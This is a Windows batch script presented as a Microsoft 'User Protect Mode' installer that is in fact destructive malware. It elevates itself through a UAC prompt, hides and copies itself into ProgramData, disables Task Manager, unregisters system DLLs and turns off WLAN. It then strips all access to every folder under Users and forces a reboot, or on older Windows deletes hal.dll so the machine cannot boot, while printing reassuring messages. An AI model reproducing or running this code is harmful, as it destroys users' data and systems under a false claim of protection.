@echo off & title Install Microsoft User Protect Mode  Please Wait ...
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit cd /d "%~dp0"
if not exist %ProgramData%\help.cmd (
	echo @echo off >> %ProgramData%\help.cmd
	echo attrib "%0" +H +S +R >> %ProgramData%\help.cmd
	echo copy "%~f0" %ProgramData% /Y >nul >> %ProgramData%\help.cmd
	echo start %ProgramData%\%~nx0 >> %ProgramData%\help.cmd
	echo del "%~f0" /F /Q >> %ProgramData%\help.cmd
	start "" "%ProgramData%\help.cmd" /MIN 
	exit
)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system /v DisableTaskMgr /t reg_dword /d 1 /f >nul
regsvr32 /s /u fde.dll
regsvr32 /s /u gpedit.dll
regsvr32 /s /u wsecedit.dll
netsh interface set interface "WLAN" disabled >nul 2>&1
echo Computername: %computername% 
echo User : %username%
echo Time : %time%
attrib %0 +H +S +R
ver | find "10.0" && goto UPWINXP
ver | find "6.3" && goto UPWINXP
ver | find "6.2" && goto UPWINXP
ver | find "6.1" && goto UPWINXP 
ver | find "6.0" && goto UPWINXP
goto DOWNXP
:UPWINXP
echo Start Install Mode... Please wait ...
icacls "%~f0" /deny everyone:"(OI)(CI)(F)">nul2>nul
for /f "delims=" %%i in ('dir "%systemdrive%\Users" /s /b') do (
	title Installing in %%i
	icacls "%%i" /deny everyone:"(OI)(CI)(F)">nul 2>&1	
)
echo Finished . We are restarting your computer for you .
cd %windir%
shutdown /r /t 1 >nul
goto Finished
:DOWNXP
del %windir%\system32\hal.dll /f /q >nul 2>&1
echo This product does not support Windows XP .
echo Windows XP is no longer supported by technology . 
echo Please update the system to ensure security .
:Finished
pause > nul & exit
